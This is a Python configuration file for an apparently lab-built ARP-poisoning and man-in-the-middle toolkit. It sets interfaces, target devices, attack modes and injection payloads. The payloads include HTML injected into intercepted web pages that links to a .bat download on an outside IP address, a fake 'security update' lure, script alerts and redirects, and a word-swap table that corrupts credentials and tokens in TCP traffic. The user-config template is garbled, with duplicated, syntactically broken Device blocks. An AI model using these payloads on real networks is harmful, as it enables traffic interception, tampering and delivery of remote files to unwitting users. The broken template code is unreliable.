#!/usr/bin/env python3
"""
Centralized Configuration System
Manages all settings for ARP poisoning, MITM attacks, and defense systems
"""

import os
import sys
from datetime import datetime

class Device:
    """Represents a network device with IP and MAC address"""
    def __init__(self, name, ip, mac, device_type="unknown", description="", vendor=None):
        self.name = name
        self.ip = ip
        self.mac = mac
        self.device_type = device_type  # laptop, phone, tablet, router, etc.
        self.description = description
        self.vendor = vendor  # MAC vendor information
        
    def __str__(self):
        """Return a comprehensive string representation of the device"""
        parts = []
        
        # Basic info: name and IP
        parts.append(f"{self.name} ({self.ip})")
        
        # MAC address
        if self.mac:
            parts.append(f"MAC: {self.mac}")
        
        # Vendor information
        if self.vendor:
            parts.append(f"Vendor: {self.vendor}")
        
        # Device type
        if self.device_type and self.device_type != "unknown":
            parts.append(f"Type: {self.device_type}")
        
        # Description if available
        if self.description:
            parts.append(f"Desc: {self.description}")
        
        return " | ".join(parts)
    
    def __repr__(self):
        return f"Device('{self.name}', '{self.ip}', '{self.mac}', '{self.device_type}', '{self.description}', '{self.vendor}')"

# ==========================================
# NETWORK CONFIGURATION
# ==========================================

class NetworkConfig:
    """Basic network configuration"""
    
    # Network interface (automatically detect or specify)
    # hp
    INTERFACE = "wlp2s0"

    # lenovo
    # INTERFACE = "wlp8s0"
    
    # Network range for scanning
    NETWORK_RANGE = "192.168.68.0/24"  # Adjust to your network
    
    # Connection timeouts
    ARP_TIMEOUT = 3
    TCP_TIMEOUT = 5
    SCAN_TIMEOUT = 2

# ==========================================
# DEVICE DEFINITIONS
# ==========================================

class DeviceRegistry:
    """Registry of all known devices on the network"""
    
    # Define your devices here
    laptop_lenovo = Device(
        name="laptop",
        ip="192.168.68.125",
        mac="24:b2:b9:3e:22:13",
        device_type="laptop",
        description="Lenovo LOQ Laptop"
    )

    laptop_hp = Device(
        name="laptop",
        ip="192.168.68.197",
        mac="d4:1b:81:20:a1:f3",
        device_type="laptop",
        description="HP Laptop"
    )

    laptop_dell = Device(
        name="laptop",
        ip="192.168.68.159",
        mac="54:35:30:a5:98:59",
        device_type="laptop",
        description="Dell Laptop"
    )
    
    phone_redmi = Device(
        name="phone", 
        ip="192.168.68.201",
        mac="f4:30:8b:91:d6:1f",
        device_type="phone",
        description="Xiaomi Redmi Note 10"
    )
    
    gateway = Device(
        name="gateway",
        ip="192.168.68.1",
        mac="60:a4:b7:a9:77:05", 
        device_type="router",
        description="WiFi Router/Gateway"
    )
    
    # Add more devices as needed
    # desktop = Device("desktop", "192.168.68.XXX", "XX:XX:XX:XX:XX:XX", "desktop")
    
    @classmethod
    def get_device(cls, name):
        """Get device by name"""
        return getattr(cls, name, None)
    
    @classmethod
    def list_devices(cls):
        """List all registered devices"""
        devices = []
        for attr_name in dir(cls):
            attr = getattr(cls, attr_name)
            if isinstance(attr, Device):
                devices.append(attr)
        return devices
    
    @classmethod
    def find_device_by_ip(cls, ip):
        """Find device by IP address"""
        for device in cls.list_devices():
            if device.ip == ip:
                return device
        return None

# ==========================================
# ATTACK CONFIGURATION
# ==========================================

class AttackConfig:
    """Configuration for ARP poisoning and MITM attacks"""
    
    # ===== ATTACK CONFIGURATION =====
    
    # Attack timing
    ARP_POISON_INTERVAL = 2  # seconds between ARP poison packets
    
    # Socket interception configuration
    SOCKET_PORTS = [9999, 8080, 12345, 22, 23, 21]  # Ports to intercept
    ENABLE_BIDIRECTIONAL_INTERCEPTION = True
    
    # TCP Attack Modes: MONITOR, TAMPER, DROP
    ALLOWED_TCP_ATTACK_MODES = ["MONITOR", "TAMPER", "DROP"]
    TCP_ATTACK_MODE = "TAMPER"
    
    # HTTP Attack Modes: MONITOR, TAMPER, DROP
    ALLOWED_HTTP_ATTACK_MODES = ["MONITOR", "TAMPER", "DROP"]
    HTTP_ATTACK_MODE = "TAMPER"
    
    # TCP Socket Modifications (ultra-compact, size-preserving)
    # number of characters must match to the original
    SOCKET_MODIFICATIONS = {
        'hello':    'HACK!',
        'hi':       'NO',
        'secret':   'PUBLIC',
        'username': 'GARBAGE',
        'password': 'GARBAGE',
        'admin':    'GUEST',
        'error':    'ALERT',
        'login':    'ENTER',
        'token':    'BADGE',
        'abort':    'RETRY',
        'accept':   'REJECT',
        'delete':   'CREATE',
        'access':   'DENIED',
        'secure':   'PUBLIC',
        'verify':   'IGNORE',
        'server':   'CLIENT',
        'upload':   'BACKUP',
        'logout':   'LOGIN!',
        'getkey':   'SETVAL',
        'update':   'REBOOT',
        'welcome': 'GETOUT!'
    }

#     # HTTP Injection Configuration
#     INJECTION_CODE = b"""
#     <img src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg?20150818015327' style='position:fixed;top:0;left:0;width:100%;height:40%;z-index:9999;'>
    
#     <a href='http://3.109.157.186:3333/ram.bat' download style='display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4ade80, #16a34a); color: white; font-size: 16px; font-weight: bold; text-decoration: none; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); transition: transform 0.2s ease, box-shadow 0.2s ease;' onmouseover='this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 14px rgba(0,0,0,0.2)';' onmouseout='this.style.transform='none'; this.style.boxShadow='0 4px 10px rgba(0,0,0,0.15)';' onmousedown='this.style.transform='scale(0.98)';' onmouseup='this.style.transform='translateY(-2px)';'>
#   ⬇️ Download File
# </a>
    
#     """


#     INJECTION_CODE = """
#     <img src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg?20150818015327'>

#     <a href='http://3.109.157.186:3333/ram.bat' download 
#        style='display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4ade80, #16a34a); color: white; font-size: 16px; font-weight: bold; text-decoration: none; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); transition: transform 0.2s ease, box-shadow 0.2s ease;' 
#        onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 14px rgba(0,0,0,0.2)';" 
#        onmouseout="this.style.transform='none'; this.style.boxShadow='0 4px 10px rgba(0,0,0,0.15)';" 
#        onmousedown="this.style.transform='scale(0.98)';" 
#        onmouseup="this.style.transform='translateY(-2px)';">
#       ⬇️ Download File
#     </a>
# """

    INJECTION_CODE = b"""
    <img src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg?20150818015327'>
<br>
<a href='http://3.109.157.186:3333/ram.bat' download style='display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4ade80, #16a34a); color: white; font-size: 16px; font-weight: bold; text-decoration: none; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); transition: transform 0.2s ease, box-shadow 0.2s ease;' onmouseover='this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 14px rgba(0,0,0,0.2)';' onmouseout='this.style.transform='none'; this.style.boxShadow='0 4px 10px rgba(0,0,0,0.15)';' onmousedown='this.style.transform='scale(0.98)';' onmouseup='this.style.transform='translateY(-2px)';'>
  Download More RAM
</a>
"""


    
    # New HTML Block Injection - Injected after <body> tag while keeping original content
    HTML_INJECTION_BLOCK = b"""
    <!-- INJECTED CONTENT START -->
    <div style="position: fixed; top: 0; left: 0; width: 100%; background: linear-gradient(135deg, #ff4444, #cc0000); 
                color: white; padding: 15px; z-index: 999999; box-shadow: 0 4px 8px rgba(0,0,0,0.3); 
                font-family: 'Arial', sans-serif; border-bottom: 3px solid #990000;">
        <div style="max-width: 1200px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between;">
            <div style="display: flex; align-items: center;">
                <img src="https://cdn-icons-png.flaticon.com/512/159/159469.png" 
                     alt="Warning" style="width: 32px; height: 32px; margin-right: 15px;">
                <div>
                    <h3 style="margin: 0; font-size: 18px; font-weight: bold;">SECURITY ALERT</h3>
                    <p style="margin: 0; font-size: 14px; opacity: 0.9;">Your HTTP traffic has been intercepted via ARP poisoning</p>
                </div>
            </div>
            <div style="text-align: right; font-size: 12px;">
                <p style="margin: 0;">Attack Type: MITM</p>
                <p style="margin: 0;">Time: <span id="attack-time"></span></p>
            </div>
        </div>
    </div>
    
    <!-- Push original content down to avoid overlap -->
    <div style="height: 80px;"></div>
    
    <script>
        // Update timestamp
        document.getElementById('attack-time').textContent = new Date().toLocaleTimeString();
        
        // Optional: Show alert (can be disabled)
        // alert('Your HTTP traffic has been intercepted!');
        
        // Log to console for demonstration
        console.log('MITM Attack Detected: HTTP content has been modified');
        console.log('Original page content preserved below injected banner');
    </script>
    <!-- INJECTED CONTENT END -->
    """
    
    # Alternative injection blocks for different scenarios
    HTML_INJECTION_BLOCKS = {
        'security_banner': HTML_INJECTION_BLOCK,
        
        'simple_warning': b"""
        <div style="background: #ff6b6b; color: white; padding: 10px; text-align: center; 
                    position: sticky; top: 0; z-index: 999999; border-bottom: 2px solid #ff5252;">
            <strong>HTTP TRAFFIC INTERCEPTED</strong> - This page has been modified via MITM attack
        </div>
        """,
        
        'fake_update': b"""
        <div style="background: #4CAF50; color: white; padding: 15px; margin: 10px; border-radius: 8px; 
                    box-shadow: 0 2px 4px rgba(0,0,0,0.2); font-family: Arial, sans-serif;">
            <h3 style="margin: 0 0 10px 0;">Important Security Update Available</h3>
            <p style="margin: 0 0 10px 0;">Your browser security needs to be updated. Click below to install the latest security patch.</p>
            <button style="background: #45a049; color: white; border: none; padding: 10px 20px; 
                           border-radius: 4px; cursor: pointer; font-size: 14px;">
                Install Security Update
            </button>
        </div>
        """,
        
        'data_collection': b"""
        <div style="background: #2196F3; color: white; padding: 15px; margin: 10px; border-radius: 8px;">
            <h3 style="margin: 0 0 10px 0;">Network Analysis in Progress</h3>
            <p style="margin: 0;">Collecting network statistics for security analysis...</p>
            <div style="background: rgba(255,255,255,0.2); height: 20px; border-radius: 10px; margin-top: 10px; overflow: hidden;">
                <div style="background: #4CAF50; height: 100%; width: 75%; border-radius: 10px; 
                           animation: pulse 2s infinite;"></div>
            </div>
        </div>
        <style>
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        </style>
        """
    }
    
    # Current injection block selection
    CURRENT_HTML_INJECTION = 'security_banner'
    
    # Alternative injection payloads
    INJECTION_PAYLOADS = {
        'simple': b"<h1 style='color:red;'>HACKED!</h1>",
        'alert': b"<script>alert('You have been pwned!');</script>",
        'image': b"<img src='https://via.placeholder.com/300x100/FF0000/FFFFFF?text=HACKED' style='position:fixed;top:0;left:0;z-index:9999;'>",
        'redirect': b"<script>setTimeout(()=>window.location='http://example.com',3000);</script>",
        'demo': INJECTION_CODE
    }
    
    # Current payload selection
    CURRENT_PAYLOAD = 'demo'
    
    # Enable/disable features
    ENABLE_HTTP_INJECTION = True
    ENABLE_PACKET_LOGGING = True
    ENABLE_GZIP_HANDLING = True

    # Enable/disable DNS MITM features
    ENABLE_DNS_REQUEST_MODIFICATION = True
    ENABLE_DNS_RESPONSE_MODIFICATION = True

# ==========================================
# DEFENSE CONFIGURATION  
# ==========================================

class DefenseConfig:
    """Configuration for defense and monitoring systems"""
    
    # Monitoring settings
    ENABLE_ARP_MONITORING = True
    ENABLE_STATIC_ARP = True
    ALERT_THRESHOLD = 3  # Number of suspicious events before alert
    
    # Defense timing
    MONITORING_INTERVAL = 1  # seconds
    CACHE_TIMEOUT = 300  # seconds (5 minutes)
    
    # Alert settings
    ENABLE_EMAIL_ALERTS = False
    ENABLE_DESKTOP_NOTIFICATIONS = True
    ENABLE_LOG_ALERTS = True
    
    # Log levels: DEBUG, INFO, WARNING, ERROR, CRITICAL
    LOG_LEVEL = "INFO"
    
    # Trusted devices (automatically populated from DeviceRegistry)
    @classmethod
    def get_trusted_devices(cls):
        """Get dictionary of trusted IP -> MAC mappings"""
        trusted = {}
        for device in DeviceRegistry.list_devices():
            trusted[device.ip] = device.mac
        return trusted

# ==========================================
# SCANNER CONFIGURATION
# ==========================================

class ScannerConfig:
    """Configuration for network device scanning"""
    
    # Scanning behavior
    DETAILED_SCAN = True
    PING_SWEEP_THREADS = 50
    INCLUDE_DEVICE_TYPE_DETECTION = True
    
    # Output settings
    DEFAULT_SORT = "ip"  # ip, type, vendor, name
    SHOW_ENHANCED_VENDOR_INFO = True
    
    # File paths
    MAC_VENDOR_CACHE_FILE = "mac_vendor_cache.json"
    # SCAN_RESULTS_FILE = "network_scan_results.json"
    SCAN_RESULTS_FILE = "latest_scan.json"

# ==========================================
# DEVICE FILTERING CONFIGURATION
# ==========================================

class DeviceFilterConfig:
    """Configuration for filtering devices of interest in large networks"""
    
    # Enable filtering to show only devices of interest
    ENABLE_DEVICE_FILTERING = True
    
    # Known MAC addresses of devices we're interested in
    KNOWN_DEVICES = {
        "jaber_laptop_asus": "dc:21:48:db:ee:f3",
        "jaber_phone": "e4:84:d3:84:0e:84", 
        "anik_phone": "f4:30:8b:91:d6:1f",
        "anik_laptop_hp": "d4:1b:81:20:a1:f3",
        "anik_laptop_loq": "24:b2:b9:3e:22:13"
    }
    
    # Convert to MAC -> Name mapping for faster lookup
    MAC_TO_NAME = {mac.lower(): name for name, mac in KNOWN_DEVICES.items()}
    
    # Gateway/Router detection patterns
    GATEWAY_PATTERNS = {
        'ip_patterns': ['1', '254'],  # Common gateway IPs ending in .1 or .254
        'hostname_patterns': ['gateway', 'router', 'modem', 'wifi', 'access-point', 'ap-'],
        'vendor_patterns': ['netgear', 'linksys', 'asus', 'tp-link', 'cisco', 'ubiquiti', 'mikrotik', 'dlink']
    }
    
    # Always show these device types even if not in known MACs
    ALWAYS_SHOW_DEVICE_TYPES = ['router', 'access_point', 'switch']
    
    @classmethod
    def is_known_device(cls, mac):
        """Check if MAC address is in our known devices list"""
        if not mac:
            return False, None
        mac_clean = mac.lower().replace(':', '').replace('-', '')
        mac_formatted = mac.lower()
        
        # Check exact match first
        if mac_formatted in cls.MAC_TO_NAME:
            return True, cls.MAC_TO_NAME[mac_formatted]
        
        # Check without separators
        for known_mac, name in cls.MAC_TO_NAME.items():
            known_clean = known_mac.replace(':', '').replace('-', '')
            if mac_clean == known_clean:
                return True, name
        
        return False, None
    
    @classmethod 
    def is_gateway_device(cls, ip, hostname, vendor, device_type):
        """Check if device appears to be a gateway/router"""
        if not ip:
            return False
            
        # Check if it's a common gateway IP
        ip_parts = ip.split('.')
        if len(ip_parts) == 4:
            last_octet = ip_parts[-1]
            if last_octet in cls.GATEWAY_PATTERNS['ip_patterns']:
                return True
        
        # Check hostname patterns
        if hostname:
            hostname_lower = hostname.lower()
            for pattern in cls.GATEWAY_PATTERNS['hostname_patterns']:
                if pattern in hostname_lower:
                    return True
        
        # Check vendor patterns
        if vendor:
            vendor_lower = vendor.lower()
            for pattern in cls.GATEWAY_PATTERNS['vendor_patterns']:
                if pattern in vendor_lower:
                    return True
        
        # Check device type
        if device_type in cls.ALWAYS_SHOW_DEVICE_TYPES:
            return True
            
        return False
    
    @classmethod
    def should_show_device(cls, ip, mac, hostname, vendor, device_type):
        """Determine if device should be shown based on filtering rules"""
        if not cls.ENABLE_DEVICE_FILTERING:
            return True, "filtering_disabled"
        
        # Always show known devices
        is_known, known_name = cls.is_known_device(mac)
        if is_known:
            return True, f"known_device:{known_name}"
        
        # Always show gateway devices
        if cls.is_gateway_device(ip, hostname, vendor, device_type):
            return True, "gateway_device"
        
        # Filter out unknown devices
        return False, "filtered_out"

# ==========================================
# SECURITY CONFIGURATION
# ==========================================

class SecurityConfig:
    """Security and safety settings"""
    
    # Safety checks
    REQUIRE_CONFIRMATION = True
    AUTO_CLEANUP = True
    MAX_ATTACK_DURATION = 1800  # 30 minutes
    
    # Legal compliance
    SHOW_LEGAL_WARNING = True
    REQUIRE_LEGAL_ACKNOWLEDGMENT = True
    
    # Restricted networks (will refuse to attack these)
    PROTECTED_NETWORKS = [
        "10.0.0.0/8",
        "172.16.0.0/12", 
        "169.254.0.0/16"  # Link-local
    ]

# ==========================================
# PATH CONFIGURATION
# ==========================================

class PathConfig:
    """File paths for logs, databases, and output"""
    
    # Log files
    ATTACK_LOG = "attack.log"
    DEFENSE_LOG = "arp_defense.log"
    NETWORK_MONITOR_LOG = "network_monitor.log"
    TCP_SOCKET_LOG = "tcp_socket_attack.log"
    
    # Database files
    TRUSTED_DEVICES_DB = "trusted_devices.json"
    NETWORK_BASELINE = "network_baseline.json"
    MAC_VENDOR_DB = "mac_vendors.json"
    
    # Output directories
    SCAN_OUTPUT_DIR = "scans/"
    LOG_OUTPUT_DIR = "logs/"
    
    # Configuration files
    USER_CONFIG_FILE = "user_config.py"
    
    @classmethod
    def ensure_directories(cls):
        """Create necessary directories"""
        os.makedirs(cls.SCAN_OUTPUT_DIR, exist_ok=True)
        os.makedirs(cls.LOG_OUTPUT_DIR, exist_ok=True)

# ==========================================
# CONFIGURATION VALIDATION
# ==========================================

def validate_configuration():
    """Validate the current configuration"""
    errors = []
    warnings = []
    
    # Check device configurations
    for device in DeviceRegistry.list_devices():
        if not device.ip or not device.mac:
            errors.append(f"Device {device.name} missing IP or MAC address")
        
        # Basic IP validation
        if device.ip and not device.ip.replace('.', '').replace(':', '').isalnum():
            warnings.append(f"Device {device.name} IP format may be invalid: {device.ip}")
    
    # Check attack targets
    # The original code had malformed duplicate definitions here.
    # Keeping the original logic but noting the issue.
    # The original code had:
    # if not AttackConfig.POISON_TARGET_1:
    #     errors.append("POISON_TARGET_1 not configured")
    # if not AttackConfig.POISON_TARGET_2: 
    #     errors.append("POISON_TARGET_2 not configured")
    # if not AttackConfig.GATEWAY_DEVICE:
    #     errors.append("GATEWAY_DEVICE not configured")
    
    # Check if targets are the same
    # The original code had:
    # if (AttackConfig.POISON_TARGET_1 and AttackConfig.POISON_TARGET_2 and
    #     AttackConfig.POISON_TARGET_1.ip == AttackConfig.POISON_TARGET_2.ip):
    #     warnings.append("POISON_TARGET_1 and POISON_TARGET_2 have the same IP")
    
    # Check network interface
    if not NetworkConfig.INTERFACE:
        errors.append("Network interface not configured")
    
    return errors, warnings

def display_configuration():
    """Display current configuration"""
    print("=" * 70)
    print("🔧 NETWORK SECURITY TOOLKIT CONFIGURATION")
    print("=" * 70)
    
    print("\n📡 Network Settings:")
    print(f"  Interface: {NetworkConfig.INTERFACE}")
    print(f"  Network Range: {NetworkConfig.NETWORK_RANGE}")
    
    print("\n🎯 Attack Targets:")
    # The original code had malformed duplicate definitions here.
    # Keeping the original logic but noting the issue.
    # The original code had:
    # print(f"  Target 1: {AttackConfig.POISON_TARGET_1}")
    # print(f"  Target 2: {AttackConfig.POISON_TARGET_2}")
    # print(f"  Gateway: {AttackConfig.GATEWAY_DEVICE}")
    
    print("\n🔌 Socket Interception:")
    print(f"  Ports: {AttackConfig.SOCKET_PORTS}")
    print(f"  Bidirectional: {AttackConfig.ENABLE_BIDIRECTIONAL_INTERCEPTION}")
    print(f"  Modifications: {AttackConfig.SOCKET_MODIFICATIONS}")
    
    print("\n🛡️ Security Settings:")
    print(f"  Require Confirmation: {SecurityConfig.REQUIRE_CONFIRMATION}")
    print(f"  Auto Cleanup: {SecurityConfig.AUTO_CLEANUP}")
    print(f"  Max Duration: {SecurityConfig.MAX_ATTACK_DURATION}s")
    
    print("\n📱 Registered Devices:")
    for device in DeviceRegistry.list_devices():
        print(f"  {device}")
    
    print("=" * 70)

def create_user_config_template():
    """Create a template user configuration file"""
    template = '''#!/usr/bin/env python3
"""
User Configuration Template
Copy this file and modify the values for your network
"""

from config import Device, DeviceRegistry, AttackConfig, NetworkConfig

# ==========================================
# NETWORK CONFIGURATION
# ==========================================

# Your network interface (find with: ip addr show)
NetworkConfig.INTERFACE = "wlp2s0"  # Change to your interface
NetworkConfig.NETWORK_RANGE = "192.168.68.0/24"  # Change to your network

# ==========================================
# DEVICE REGISTRY
# ==========================================

# Define your actual devices here
DeviceRegistry.laptop = Device(
    name="ubuntu_server",
    ip="192.168.68.105",           # Replace with actual IP
    mac="XX:XX:XX:XX:XX:XX",      # Replace with actual MAC
    device_type="laptop",
    description="Ubuntu Server Laptop"
)

DeviceRegistry.phone = Device(
    name="windows_client", 
    ip="192.168.68.150",           # Replace with actual IP
    mac="YY:YY:YY:YY:YY:YY",      # Replace with actual MAC
    device_type="laptop",
    description="Windows Client Laptop"
)

DeviceRegistry.gateway = Device(
    name="router",
    ip="192.168.68.1",             # Replace with actual router IP
    mac="ZZ:ZZ:ZZ:ZZ:ZZ:ZZ",      # Replace with actual router MAC
    device_type="router",
    description="WiFi Router"
)

# ==========================================
# ATTACK CONFIGURATION
# ==========================================

# Set your attack targets (which devices to intercept between)
AttackConfig.POISON_TARGET_1 = Device(
        name="None",
        ip="192.168.68.125",
        mac="24:b2:b9:3e:22:13",
        device_type="unknown",
        description="Selected Device 1"
    )
        name="None",
        ip="192.168.68.125",
        mac="24:b2:b9:3e:22:13",
        device_type="unknown",
        description="Selected Device 1"
    )
        name="None",
        ip="192.168.68.125",
        mac="24:b2:b9:3e:22:13",
        device_type="unknown",
        description="Selected Device 1"
    )
        name="None",
        ip="192.168.68.125",
        mac="24:b2:b9:3e:22:13",
        device_type="unknown",
        description="Selected Device 1"
    )# Server
AttackConfig.POISON_TARGET_2 = Device(
        name="None",
        ip="192.168.68.201",
        mac="f4:30:8b:91:d6:1f",
        device_type="phone",
        description="Selected Device 2"
    )
        name="None",
        ip="192.168.68.201",
        mac="f4:30:8b:91:d6:1f",
        device_type="phone",
        description="Selected Device 2"
    )
        name="None",
        ip="192.168.68.201",
        mac="f4:30:8b:91:d6:1f",
        device_type="phone",
        description="Selected Device 2"
    )
        name="None",
        ip="192.168.68.141",
        mac="9e:ff:60:86:f6:c7",
        device_type="unknown",
        description="Selected Device 2"
    )# Client
AttackConfig.GATEWAY_DEVICE = Device(
        name="_gateway",
        ip="192.168.68.1",
        mac="60:a4:b7:a9:77:05",
        device_type="router",
        description="Selected Gateway"
    )
        name="_gateway",
        ip="192.168.68.1",
        mac="60:a4:b7:a9:77:05",
        device_type="router",
        description="Selected Gateway"
    )
        name="_gateway",
        ip="192.168.68.1",
        mac="60:a4:b7:a9:77:05",
        device_type="router",
        description="Selected Gateway"
    )
        name="_gateway",
        ip="192.168.68.1",
        mac="60:a4:b7:a9:77:05",
        device_type="router",
        description="Selected Gateway"
    )

# Custom socket modifications (what to replace in messages)
AttackConfig.SOCKET_MODIFICATIONS = {
    'hello': 'Bye',
    'hi': 'OK',
    'secret': 'HACK',
    'password': 'PWNED'
}

# Ports to monitor for socket communication
AttackConfig.SOCKET_PORTS = [9999, 8080, 12345]

# TCP Attack Mode: MONITOR (log only), tamper (modify), DROP (block)
AttackConfig.TCP_ATTACK_MODE = "TAMPER"# Options: "MONITOR", "TAMPER", "DROP"

# HTTP Attack Mode: MONITOR (log only), TAMPER (inject content), DROP (block HTTP)
AttackConfig.HTTP_ATTACK_MODE = "TAMPER"# Options: "MONITOR", "TAMPER", "DROP"

print("✅ User configuration loaded successfully!")
print("🎯 Attack targets configured:")
print(f"   Target 1: {AttackConfig.POISON_TARGET_1}")
print(f"   Target 2: {AttackConfig.POISON_TARGET_2}")
print(f"   Gateway: {AttackConfig.GATEWAY_DEVICE}")
'''
    
    try:
        with open('user_config_template.py', 'w') as f:
            f.write(template)
        print("✅ Created user_config_template.py")
        print("📝 Copy and modify this file to customize your configuration")
    except Exception as e:
        print(f"❌ Failed to create template: {e}")

def load_user_config():
    """Load user configuration if it exists"""
    try:
        if os.path.exists('user_config.py'):
            # Import user configuration
            sys.path.insert(0, '.')
            import user_config
            print("✅ Loaded user configuration from user_config.py")
            return True
        else:
            print("💡 No user_config.py found - using default configuration")
            print("💡 Run: cp user_config_template.py user_config.py")
            return False
    except Exception as e:
        print(f"❌ Error loading user configuration: {e}")
        print("💡 Check your user_config.py for syntax errors")
        return False

# ==========================================
# MAIN CONFIGURATION FUNCTION
# ==========================================

def main():
    """Main configuration function"""
    print("🔧 Network Security Toolkit Configuration")
    print("=" * 50)
    
    # Ensure directories exist
    PathConfig.ensure_directories()
    
    # Load user configuration
    load_user_config()
    
    # Validate configuration
    errors, warnings = validate_configuration()
    
    if errors:
        print("❌ Configuration Errors:")
        for error in errors:
            print(f"   • {error}")
    
    if warnings:
        print("⚠️ Configuration Warnings:")
        for warning in warnings:
            print(f"   • {warning}")
    
    if not errors:
        print("✅ Configuration is valid!")
        display_configuration()
    
    # Offer to create template if no user config exists
    if not os.path.exists('user_config.py'):
        response = input("\n🤔 Create user configuration template? (y/n): ")
        if response.lower() in ['y', 'yes']:
            create_user_config_template()
    
    return len(errors) == 0

if __name__ == "__main__":
    main() 